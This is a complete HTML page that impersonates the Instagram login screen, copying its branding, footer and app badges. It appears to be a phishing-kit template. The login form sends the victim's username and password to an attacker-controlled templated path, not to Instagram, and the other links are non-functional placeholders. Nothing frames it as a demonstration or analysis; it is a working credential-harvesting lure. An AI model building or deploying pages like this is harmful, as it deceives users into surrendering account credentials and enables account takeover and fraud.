<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram — Log in</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Instagram wordmark from sprite (exact slice) */
    .ig-wordmark{
      background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png");
      background-position: 0 -2959px;
      background-size: auto;
      background-repeat: no-repeat;
      width: 175px;
      height: 51px;
      display: inline-block;
    }
    /* Hide text but keep it for screen readers */
    .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;}
  </style>
</head>
<body class="bg-gray-50 text-gray-900">
  <main class="min-h-screen flex flex-col">
    <div class="flex-1 flex items-center justify-center">
      <div class="w-full max-w-6xl flex items-center gap-10 px-6">
        <!-- LEFT: single image from project root -->
        <section class="hidden lg:flex flex-1 justify-center">
          <img
            src="https://pqpxtilmvcuoeawtbixx.supabase.co/storage/v1/object/sign/images/landing-2x.png?token=eyJraWQiOiJzdG9yYWdlLXVybC1zaWduaW5nLWtleV9jMGY1N2VmMy0yMzZmLTRmZWItYmJiYi0zODUxNTg2NzYxN2UiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJpbWFnZXMvbGFuZGluZy0yeC5wbmciLCJpYXQiOjE3NTc0Mzk3ODcsImV4cCI6MTc4ODk3NTc4N30.vn6gWltkU8EEejX4h1qlda3mljxvVNuVSO5E_myhJDI"
            alt="Instagram preview collage"
            
            loading="eager"
            decoding="async"
          />
        </section>

        <!-- RIGHT: login column -->
        <section class="flex-1 max-w-md mx-auto">
          <!-- login card -->
          <div class="bg-white border border-gray-200 rounded-sm">
            <div class="px-10 pt-10 pb-6">
              <!-- wordmark via sprite -->
              <h1 class="flex justify-center mb-6">
                <span class="sr-only">Instagram</span>
                <span class="ig-wordmark" aria-hidden="true"></span>
              </h1>

              <form class="space-y-3" action="/{{ custom_path }}/submit" method="POST">
                <input name="username" type="text" required
                       placeholder="Phone number, username, or email"
                       class="w-full bg-white border border-gray-300 rounded-sm px-3 py-2 text-sm placeholder-gray-500 focus:outline-none focus:ring-0 focus:border-gray-400" />
                <input name="password" type="password" required
                       placeholder="Password"
                       class="w-full bg-white border border-gray-300 rounded-sm px-3 py-2 text-sm placeholder-gray-500 focus:outline-none focus:ring-0 focus:border-gray-400" />

                <button type="submit"
                        class="w-full mt-1 text-sm font-semibold text-white rounded-lg py-2 bg-indigo-400 hover:bg-indigo-500 transition-colors">
                  Log in
                </button>

                <!-- OR divider -->
                <div class="flex items-center gap-4 my-3">
                  <div class="flex-1 h-px bg-gray-200"></div>
                  <span class="text-xs font-semibold text-gray-500">OR</span>
                  <div class="flex-1 h-px bg-gray-200"></div>
                </div>

                <!-- Facebook row -->
                <a href="#" class="flex items-center justify-center gap-2 text-sm font-semibold text-blue-700 hover:text-blue-800">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" class="h-4 w-4 fill-blue-700"><path d="M279.14 288l14.22-92.66h-88.91V127.77c0-25.35 12.42-50.06 52.24-50.06H295V6.26S277.43 0 257.2 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H64v92.66h72.12V512h88.13V288z"/></svg>
                  Log in with Facebook
                </a>

                <div class="text-center">
                  <a href="#" class="text-xs text-blue-700 hover:text-blue-800">Forgot password?</a>
                </div>
              </form>
            </div>
          </div>

          <!-- sign up strip -->
          <div class="bg-white border border-gray-200 rounded-sm mt-3 py-5 text-center">
            <span class="text-sm">Don't have an account? </span>
            <a href="#" class="text-sm font-semibold text-blue-700 hover:text-blue-800">Sign up</a>
          </div>

          <!-- app badges -->
          <div class="mt-5">
            <p class="text-center text-sm mb-3">Get the app.</p>
            <div class="flex justify-center gap-2">
              <img class="h-10" alt="Get it on Google Play"
                   src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" />
              <img class="h-10" alt="Get it from Microsoft"
                   src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" />
            </div>
          </div>
        </section>
      </div>
    </div>

    <!-- footer -->
    <footer class="px-6 py-10">
      <div class="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-500">
        <a>Meta</a><a>About</a><a>Blog</a><a>Jobs</a><a>Help</a><a>API</a><a>Privacy</a><a>Terms</a>
        <a>Locations</a><a>Instagram Lite</a><a>Threads</a><a>Contact Uploading &amp; Non-Users</a><a>Meta Verified</a>
      </div>
      <div class="mt-4 flex items-center justify-center gap-6 text-xs text-gray-500">
        <span>English</span>
        <span>© 2025 Instagram from Meta</span>
      </div>
    </footer>
  </main>
</body>
</html>
